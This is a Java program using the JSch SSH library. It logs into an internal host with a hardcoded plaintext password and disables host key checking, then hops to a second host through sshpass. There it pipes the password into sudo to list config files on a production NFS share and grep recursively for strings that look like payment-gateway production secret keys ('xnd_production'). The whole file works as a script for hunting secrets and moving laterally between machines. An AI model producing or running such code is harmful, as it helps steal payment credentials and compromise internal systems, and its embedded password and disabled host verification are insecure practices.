import com.jcraft.jsch.*;
import java.io.*;
class DKG {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.14.16.10 'echo ---NUCLEUS-FILES---;echo kutul0nc4t | sudo -S find /tmp/nfs_prod/nucleus/ -maxdepth 1 -type f -name \"*.properties\" -o -name \"*.yml\" -o -name \"*.xml\" -o -name \"*.conf\" -o -name \"*.json\" 2>/dev/null | head -10;echo ---ACCURATE-LS---;echo kutul0nc4t | sudo -S ls /tmp/nfs_prod/accurate/ 2>/dev/null | head -20;echo ---XENDIT-RECURSIVE---;echo kutul0nc4t | sudo -S grep -rl \"xnd_production\" /tmp/nfs_prod/ 2>/dev/null | head -5;echo ---XENDIT-BINARY---;echo kutul0nc4t | sudo -S grep -rl \"xnd_\" /tmp/nfs_prod/nucleus/ 2>/dev/null | head -5' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
